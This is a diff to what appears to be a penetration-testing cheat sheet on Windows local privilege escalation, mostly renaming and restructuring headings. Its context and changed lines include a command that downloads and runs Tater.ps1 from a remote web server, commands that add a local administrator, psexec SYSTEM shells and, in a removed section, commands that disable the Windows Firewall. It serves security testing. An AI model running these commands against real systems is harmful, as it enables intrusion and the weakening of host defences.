@@ -1,8 +1,8 @@
 # Windows - Local Privilege Escalation
 
-### Recon
+### Enumeration
 
-#### Initial recon
+###### Basic enumeration
 
 The following commands can be used to grasp a better understanding of the
 current system:
@@ -25,16 +25,16 @@ current system:
 | **Writable directories** | dir /a-rd /s /b | | |
 | **Writable files** | dir /a-r-d /s /b | | | |
 
-#### Process, services, installed programs and scheduled tasks
+###### Process, services, installed programs and scheduled tasks
 
 The following commands can be used to retrieve the process, services,
 installed programs and scheduled tasks of the host:
 
 |  | DOS | Powershell | WMI |
 |--|-----|------------|-----|
-| **Process** | tasklist | get-process<br/>Get-CimInstance Win32_Process &#124; select ProcessName, ProcessId &#124; fl *<br/>Get-CimInstance Win32_Process -Filter "name = 'PccNTMon.exe'" &#124; fl * | wmic process get CSName,Description,ExecutablePath,ProcessId |
+| **Process** | tasklist | Get-Process<br/>Get-CimInstance Win32_Process &#124; select ProcessName, ProcessId &#124; fl *<br/>Get-CimInstance Win32_Process -Filter "name = 'PccNTMon.exe'" &#124; fl * | wmic process get CSName,Description,ExecutablePath,ProcessId |
 
-#### Network
+###### Network
 
 The following commands can be used to retrieve information about the network
 interfaces and active connections of the host:
@@ -45,9 +45,7 @@ interfaces and active connections of the host:
 | Listening ports | netstat -ano | Get-NetTCPConnection <br/>Get-NetUDPEndpoint | |
 
 
-### Exploit
-
-#### Physical access privileges escalation
+### Physical access privileges escalation
 
 Physical access open up different ways to bypass user login screen and
 obtain SYSTEM access from no account.
@@ -114,7 +112,7 @@ The procedure to do so is as follow:
   user
 
 
-#### File system & registry
+### File system & registry
 
 ###### Clear text password in files
 
@@ -203,7 +201,7 @@ The following files may contains sensible information:
 %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
-#### Unpatched system
+### Unpatched system
 
 ###### OS and Kernel version
 
@@ -315,7 +313,7 @@ Ubiquiti UniFi Video
 -- https://www.exploit-db.com/exploits/43390/
 ```
 
-#### Services
+### Services
 
 ###### Weak services permissions
 
@@ -407,9 +405,7 @@ Get-ServiceUnquoted
 exploit/windows/local/trusted_service_path
 ```
 
-
-
-###### Exploit and restart service
+###### Exploit and restart a service
 
 *Add a local administrator user*
 
@@ -449,10 +445,11 @@ net start <SERVICE>
 Start-Service -Name <SERVICE>
 ```
 
+### AlwaysInstallElevated
 
-#### AlwaysInstallElevated
+TODO
 
-#### Token Privileges abuse
+### Token Privileges abuse
 
 ###### Vulnerable privileges
 
@@ -517,7 +514,7 @@ Invoke-Tater -Command "net user <USERNAME> <PASSWORD> /add && net localgroup adm
 powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Tater.ps1'); Invoke-Tater -Command <POWERSHELLCMD>;
 ```
 
-#### Credentials re-use
+### Credentials re-use
 
 To use another user credentials, psexec can be used to start a cmd shell or start a
 reverse shell:
@@ -550,64 +547,5 @@ an administrator account:
 psexec.exe -accepteula -s -i -d cmd.exe
 ```
 
-If a meterpreter is being used, the **getsystem** command can be leveraged to achieve the same end.
-
-### Post-Exploit
-
-#### Add local Administrator
-
-The net user commands can be used to create and add a windows account in the
-administrator group:
-
-```
-# Create a new account
-net user /add <USERNAME> <PASSWORD>
-
-# Add account as administrator
-net localgroup Administrators <USERNAME> /add
-net localgroup Administrateurs <USERNAME> /add
-```
-
-#### Manage Windows Firewall
-
-To check whether the Windows Firewall is enabled on a server or computer,
-the following command can be used as Administrator/SYSTEM:
-
-```bash
-netsh advfirewall show allprofiles
-```
-
-By default, three separate listings are present: Domain profile settings,
-private profile settings and public profile settings.  
-With the private profile, applied to a network adapter when it is connected
-to a network that is identified by the user or administrator as a private
-network, Windows enables network discovery features, allows file sharing and
-other networked features.   
-The public profile, applied to a network adapter by default or if specified so
-by an user or administrator, is the most restrictive profile. In the default
-public profile, Windows will block all inbound connections to programs that are
-not on the list of allowed programs.   
-Finally, the Domain profile is used when a server or computer is joined to an
-Active Directory domain. In this environment, firewall settings are typically
-(but not necessarily) controlled by a network administrator.
-
-To disable the firewall use the following commands:
-
-```
-# Disable current profile
-netsh advfirewall set currentprofile state off
-
-# Disable all profiles
-netsh advfirewall set allprofiles state off
-
-# Disable the private, public and domain profiles
-netsh advfirewall set privateprofile state off
-netsh advfirewall set publicprofile state off
-netsh advfirewall set domainprofile state off
-```
-
-To open a specific port, or a range, use the following command:
-
-```
-netsh advfirewall firewall add rule name="<RULE_NAME" protocol=TCP dir=in localport=<PORT> action=allow
-```
+If a meterpreter is being used, the **getsystem** command can be leveraged to
+achieve the same end.
